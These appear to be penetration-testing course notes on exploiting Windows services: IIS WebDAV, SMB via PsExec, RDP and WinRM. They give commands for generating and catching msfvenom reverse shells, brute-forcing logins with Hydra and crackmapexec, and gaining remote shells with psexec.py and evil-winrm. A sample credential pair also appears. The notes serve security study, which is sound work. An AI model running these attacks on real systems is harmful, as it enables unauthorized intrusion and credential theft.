
---


## Exploiting Microsoft IIS WebDAV



Go back to Lesson 1 (Vulnerability Assessment) under Assessment_Methodology

---


## Exploiting WebDAV with MSF


Instead of uploading a reverse shell file that Kali has by using cadaver tool, we will use MSF venom to create the reverse shell code ourselves.

To create a meterpreter reverse shell session using msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=(our IP addrress) LPORT=(port number we will listen to) -f (file format) > (filename.fileformat ) `

**If we are not sure about the architecture of the target we are dealing with whether it was 32-bit or 64-bit, choosing 32-bit will work either way.**

This will generate to us a script in the format that we specified in a file that we specified its name.

In our example, we create a .asp file that we will upload to the WebDAV service that is running on our target using cadaver.

After uploading the reverse shell file, we will start postgresql and msf  as usual.

In msfconsole, we will start the module multi/handler by :`use multi/handler`  which is a **universal payload handler** used to catch and interact with reverse shells and Meterpreter sessions from compromised targets.

We will use the same payload name that we specified earlier, in our case is "windows/meterpreter/reverse_tcp" and we also need to specify our IP address and port number. **IP address and port number have to be the same as we specified in the reverse shell file that we created earlier.**
The entire command to set this up is:
```bash 
msf6> use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST (your IP address)
set LPORT (open port number)
run 
```

Then, we click on the file that we uploaded on the target site to execute the code and to create a meterpreter session in msf.

After getting a meterpreter session in msf, we can switch to a shell session to have full functionality of a command line by: `shell`

**Luckily, there is a msf module that we can use that would automate the whole process for us, the module is: "exploit/windows/iis/iis_webdav_upload_asp"**

Note: when specifying the path, we need to also specify the filename with its extension (always .asp in this case).

The module will need the valid credentials to access the WebDAV service for it to work. 

---

## Exploiting SMB With PsExec

### SMB Authentication

The SMB protocol utilizes two levels of authentication:
- User Authentication
- Share Authentication

**User Authentication:** Users must provide a username and password to access the SMB server and to access the shares.
**Share Authentication**: Users must provide a password in order to access restricted shares.

**Note: Both of these authentication levels utilize a challenge response authentication system**

### PsExec

PsExec is a lightweight telnet-replacement developed by Microsoft that allows us to execute processes on remote windows systems using any user's credentials.

PsExec authentication is performed by SMB.

We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt.

It is very similar to RDP, however, instead of controlling the remote system via GUI, command are sent via CMD.

In order to utilize PsExec, we need a set of valid credentials that has a username and password or password hash.

We can obtain a valid set of credentials by performing brute force attack on SMB 

After using the "scanner/smb/smb_login" module in msf to brute force a valid set of credentials, **we will use the "psexec.py" script to have a reverse shell to the target. This script could be found under "/usr/share/doc/python3-impacket/examples"**

To use it:`python3 ./psexec.py (username):(password)@(target IP)`

---

## Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)


Refer to Lesson 2 (Vulnerability Analysis) in Assessment_Methodologies/Vulnerability Assessment.

---


## Exploiting RDP

RDP authentication requires a valid user account on the target system as well as the password in clear text.
We can preform an RDP brute-force attack to identify valid credentials.

Sometimes, Nmap can't reveal what service is running on some ports. To make sure that RDP is running on a certain port, we can use the MSF module: "scanner/rdp/rdp_scanner". This will reveal to us whether if RDP is running on a certain port or not.

To brute-force RDP, we will use Hydra:`hydra -L (users list) -P (passwords list) rdp://(targetIP):(port)`

**Note: To be more quieter and to not crash the service we are brute-forcing in to, we can reduce the parallel tasks that hydra is doing by using the option "-t"**

**After getting valid credentials, we will use a tool called "- xfreerdp"** to connect via RDP.

We will use it like so:`xfreerdp /v:(target-ip) /u:(username) /p:(password)`

---

## Exploiting WinRM

Microsoft implemented WinRM in to Windows in order to make life easier for system administrators. 

WinRM is typically used in the following ways:
- Remotely access and interact with Windows hosts on a local network.
- Remotely access and execute commands on Windows systems.
- Manage and configure Windows systems remotely.

**WinRM typically uses TCP port 5985 and 5986 over HTTPS.**

WinRM implements access control and security for communication between systems through various forms of authentication.

**We can utilize a utility called "crackmapexec" to perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target system.**

**We can also utilize a ruby script called "evil-winrm" to obtain a command shell session on the target system.**

We can use crackmapexec like so: `crackmapexec winrm (target IP) -u (username or usernames list file) -p (password or passwords list file)`

administrator:tinkerbell

We can use crackmapexec to execute commands as well by using the option:"-x". For example, if we want to execute the command to know what user we are logged in as, we can do so by: `crackmapexec winrm (target IP) -u (valid username) -p (valid password) -x "whoami"`

To use evil-winrm:`evil-winrm -i (target IP) -u (valid username) -p (valid password)` . This will give us a reverse shell session on the target machine.

**We can also use the exploit model in MSF to get a meterpreter session to the target system: windows/winrm/winrm_script_exec**

